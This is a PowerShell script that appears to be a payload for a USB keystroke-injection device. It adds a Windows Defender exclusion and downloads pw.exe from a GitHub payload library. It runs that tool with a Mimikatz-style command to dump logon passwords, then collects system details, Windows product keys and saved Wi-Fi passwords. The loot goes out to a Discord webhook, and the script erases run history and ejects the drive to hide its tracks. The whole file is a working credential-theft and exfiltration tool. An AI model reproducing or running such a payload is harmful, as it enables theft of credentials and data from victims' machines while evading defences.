#Define script variables
$ErrorActionPreference = "SilentlyContinue"
$timeformat = Get-Date -Format yyyy-MM-dd_HHmm
$hostname = $env:computername
$filetimestamp = $hostname+'_'+$timeformat

#-----------------------------------------------------------
# CREATE BASIC LOOT DIR
#-----------------------------------------------------------
$BBPath = (gwmi win32_volume -f 'label=''CIRCUITPY''').Name+"loot\Computer_Info\$filetimestamp\"
$LootDir = New-Item -ItemType directory -Force -Path "$BBPath"
$outpath = "c:\pw\pw.exe"
$url = "https://raw.githubusercontent.com/hak5/usbrubberducky-payloads/master/payloads/library/credentials/Funni_Stick_V3/pw.exe"
#-----------------------------------------------------------
# Get executable and disable firewall
#-----------------------------------------------------------
cd c:\
mkdir pw
Import-Module Defender
Set-MpPreference -ExclusionPath "c:\pw"
Invoke-WebRequest -Uri $url -OutFile $outpath
cd pw
.\pw.exe sekurlsa::logonPasswords full > $LootDir\computer_info`.txt exit
Remove-MpPreference -ExclusionPath "c:\pw"

#-----------------------------------------------------------
# CREATE BASIC SYSTEM INFORMATION
#-----------------------------------------------------------

"BIOS Information:" >> "$LootDir\computer_info.txt" 
Get-WmiObject -Class Win32_BIOS -ComputerName . >> "$LootDir\computer_info.txt"

"Basic Computer Info:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_ComputerSystem >> "$LootDir\computer_info.txt"

"Detailed Computer Info:" >> "$LootDir\computer_info.txt"
Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, Version, OSArchitecture, OSLanguage, OSType, OSProductSuite, ServicePackMajorVersion, ServicePackMinorVersion, SuiteMask, Buildnumber, CSName, RegisteredUser, SerialNumber, InstallDate, BootDevice, SystemDevice, SystemDirectory, SystemDrive, WindowsDirectory, LastBootUpTime, LocalDateTime, CountryCode, FreePhysicalMemory, FreeVirtualMemory, CurrentTimeZone, NumberOfProcesses, NumberOfUsers, DataExecutionPrevention_Available, DataExecutionPrevention_32BitApplications >> "$LootDir\computer_info.txt"

"BIOS Windows Serial Key:" >> "$LootDir\computer_info.txt"
wmic path softwarelicensingservice get OA3xOriginalProductKey  >> "$LootDir\computer_info.txt"

"Registry Windows Backup Serial Key:" >> "$LootDir\computer_info.txt"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" | select BackupProductKeyDefault >> "$LootDir\computer_info.txt"

"Disk Space Info:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" -ComputerName . >> "$LootDir\computer_info.txt"

"Installed Hotfixes:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName . >> "$LootDir\computer_info.txt"

"Session Logon Information:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_LogonSession -ComputerName . >> "$LootDir\computer_info.txt"

"Service Information:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_Service -ComputerName . | Format-Table -Property Status,Name,DisplayName -AutoSize -Wrap | FL >> "$LootDir\computer_info.txt"

"Installed Software:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_Product | Select-Object -Property Name | Sort-Object Name >> "$LootDir\computer_info.txt"

#-----------------------------------------------------------
# Network addresses
#-----------------------------------------------------------
"Network Infomation:" >> "$LootDir\computer_info.txt"
Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> "$LootDir\computer_info.txt"

#-----------------------------------------------------------
# WIFI KEYS
#-----------------------------------------------------------

"Wireless Infomation:" >> "$LootDir\computer_info.txt"
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> "$LootDir\computer_info.txt"

#-----------------------------------------------------------
# UPLOAD TO DISCORD
#-----------------------------------------------------------
$filename = "$LootDir\computer_info.txt"
$fileBinary = [IO.File]::ReadAllBytes($filename)
$enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
$fileEnc = $enc.GetString($fileBinary)
$boundary = [System.Guid]::NewGuid().ToString() 
$LF = "`n"
$bodyLines = (`

  "--$boundary",`

  "Content-Disposition: form-data; name=`"Filedata`"; filename=`"$filename`"",`

  "Content-Type: application/octet-stream$LF",`

  $fileEnc,`
  
  "--$boundary--"`

) -join $LF

$url="PUT DISCORD URL IN HERE"
$Body=@{ content = "$env:computername Stats from Seeed XAIO"}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json)
Invoke-webrequest $url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
#$return = curl.exe -F "file1=@$LootDir\computer_info.txt" $url

#-----------------------------------------------------------
# CLEAR TRACKS
#-----------------------------------------------------------

Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

(New-Object -ComObject Shell.Application).Namespace(17).ParseName((gwmi win32_volume -f 'label=''CIRCUITPY''').Name).InvokeVerb("Eject")
